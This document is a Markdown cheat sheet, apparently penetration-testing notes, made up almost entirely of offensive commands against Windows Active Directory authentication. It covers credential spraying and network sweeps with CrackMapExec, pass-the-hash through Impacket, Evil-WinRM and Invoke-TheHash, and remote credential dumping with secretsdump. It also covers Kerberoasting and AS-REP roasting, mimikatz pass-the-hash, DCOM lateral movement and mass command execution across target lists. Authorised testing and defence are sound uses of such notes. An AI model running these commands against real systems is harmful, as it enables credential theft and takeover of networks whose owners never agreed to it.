# Authentication Mechanisms - Tools

## Authentication Mechanisms - Tools

This document provides an overview of essential tools for testing and interacting with various authentication mechanisms in Windows environments.

### CrackMapExec (CME)

CrackMapExec is a post-exploitation tool that helps automate assessment of large Active Directory networks.

#### Basic Usage

```bash
# Test credentials against SMB
crackmapexec smb 10.10.10.10 -u username -p password

# Test credentials against WinRM
crackmapexec winrm 10.10.10.10 -u username -p password

# Test credentials against SSH
crackmapexec ssh 10.10.10.10 -u username -p password

# Test credentials against MSSQL
crackmapexec mssql 10.10.10.10 -u username -p password
```

#### Pass-the-Hash

```bash
# SMB pass-the-hash
crackmapexec smb 10.10.10.10 -u username -H NTLM_HASH

# WinRM pass-the-hash
crackmapexec winrm 10.10.10.10 -u username -H NTLM_HASH
```

#### Authentication with Domain

```bash
# Specify domain for authentication
crackmapexec smb 10.10.10.10 -u username -p password -d domain.local

# Target a domain controller
crackmapexec smb dc01.domain.local -u username -p password -d domain.local
```

#### Network Sweeping

```bash
# Scan subnet for SMB
crackmapexec smb 10.10.10.0/24

# Scan subnet with credentials
crackmapexec smb 10.10.10.0/24 -u username -p password
```

#### Enumeration Functions

```bash
# Enumerate shares
crackmapexec smb 10.10.10.10 -u username -p password --shares

# Enumerate logged-on users
crackmapexec smb 10.10.10.10 -u username -p password --loggedon-users

# Enumerate domain users
crackmapexec smb 10.10.10.10 -u username -p password --users

# Enumerate domain groups
crackmapexec smb 10.10.10.10 -u username -p password --groups

# Get password policy
crackmapexec smb 10.10.10.10 -u username -p password --pass-pol
```

#### Command Execution

```bash
# Execute command via SMB
crackmapexec smb 10.10.10.10 -u username -p password -x "whoami /all"

# Execute PowerShell command
crackmapexec smb 10.10.10.10 -u username -p password -X '$PSVersionTable'
```

### Impacket

Impacket is a collection of Python classes for working with network protocols, particularly useful for Windows authentication.

#### PSExec

```bash
# Authenticate with password
impacket-psexec domain.local/username:password@10.10.10.10

# Pass-the-hash
impacket-psexec -hashes :NTLM_HASH domain.local/username@10.10.10.10

# Specify command to run
impacket-psexec domain.local/username:password@10.10.10.10 'ipconfig /all'
```

#### WMIExec

```bash
# Authenticate with password
impacket-wmiexec domain.local/username:password@10.10.10.10

# Pass-the-hash
impacket-wmiexec -hashes :NTLM_HASH domain.local/username@10.10.10.10
```

#### SMBExec

```bash
# Authenticate with password
impacket-smbexec domain.local/username:password@10.10.10.10

# Pass-the-hash
impacket-smbexec -hashes :NTLM_HASH domain.local/username@10.10.10.10
```

#### Secretsdump

```bash
# Remote dumping of hashes
impacket-secretsdump domain.local/username:password@10.10.10.10

# Pass-the-hash
impacket-secretsdump -hashes :NTLM_HASH domain.local/username@10.10.10.10

# SAM + LSA + Cached creds
impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL
```

#### GetNPUsers

```bash
# Get users without Kerberos pre-authentication
impacket-GetNPUsers domain.local/ -dc-ip 10.10.10.10 -usersfile users.txt -format hashcat

# With specific user
impacket-GetNPUsers domain.local/username -dc-ip 10.10.10.10
```

#### GetUserSPNs

```bash
# Kerberoasting - request service tickets
impacket-GetUserSPNs domain.local/username:password -dc-ip 10.10.10.10 -request

# Output in specific format
impacket-GetUserSPNs domain.local/username:password -dc-ip 10.10.10.10 -request -format hashcat
```

### Evil-WinRM

Evil-WinRM is a WinRM shell for pentesting/hacking Windows Remote Management.

#### Basic Usage

```bash
# Connect with password
evil-winrm -i 10.10.10.10 -u username -p password

# Pass-the-hash
evil-winrm -i 10.10.10.10 -u username -H NTLM_HASH

# Specify domain
evil-winrm -i 10.10.10.10 -u username@domain.local -p password
```

#### Advanced Features

```bash
# Load PowerShell scripts
evil-winrm -i 10.10.10.10 -u username -p password -s /path/to/ps_scripts/

# Upload file
# (After connecting, use upload command)
*Evil-WinRM> upload /local/path/file.exe C:\Windows\Temp\file.exe

# Download file
*Evil-WinRM> download C:\Windows\Temp\file.exe /local/path/file.exe

# PowerShell menu
*Evil-WinRM> menu

# Launch PowerShell commands without touching disk
*Evil-WinRM> Invoke-Binary /path/to/binary.exe
```

### Invoke-TheHash

Invoke-TheHash provides PowerShell functions for performing pass-the-hash attacks with WMI and SMB.

#### Installation

```powershell
# Import the module
Import-Module .\Invoke-TheHash.psd1
```

#### SMB Command Execution

```powershell
# Execute command via SMB using NTLM hash
Invoke-SMBExec -Target 10.10.10.10 -Domain domain.local -Username username -Hash NTLM_HASH -Command "whoami" -Verbose

# Get command output
Invoke-SMBExec -Target 10.10.10.10 -Domain domain.local -Username username -Hash NTLM_HASH -Command "whoami" -CommandOutput $true -Verbose
```

#### WMI Command Execution

```powershell
# Execute command via WMI using NTLM hash
Invoke-WMIExec -Target 10.10.10.10 -Domain domain.local -Username username -Hash NTLM_HASH -Command "whoami" -Verbose
```

#### Mass Command Execution

```powershell
# Execute on multiple targets via SMB
$targets = Get-Content .\targets.txt
foreach($target in $targets) {
    Invoke-SMBExec -Target $target -Domain domain.local -Username username -Hash NTLM_HASH -Command "whoami" -Verbose
}
```

### Lateral Movement Techniques

#### RDP with Stolen Credentials

```bash
# Using xfreerdp
xfreerdp /v:10.10.10.10 /u:username /p:password /d:domain.local +clipboard

# Pass-the-hash with mimikatz
sekurlsa::pth /user:username /domain:domain.local /ntlm:NTLM_HASH /run:"mstsc /restrictedadmin"
```

#### DCOM Lateral Movement

```powershell
# Create COM object for remote execution
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))

# Execute command
$dcom.Document.ActiveView.ExecuteShellCommand("cmd.exe", $null, "/c whoami > C:\Windows\Temp\output.txt", "7")
```

#### Common Troubleshooting

```bash
# Verify SMB connectivity
crackmapexec smb 10.10.10.10 --shares

# Check for WinRM connectivity
crackmapexec winrm 10.10.10.10

# Test credential validity without execution
crackmapexec smb 10.10.10.10 -u username -p password
```
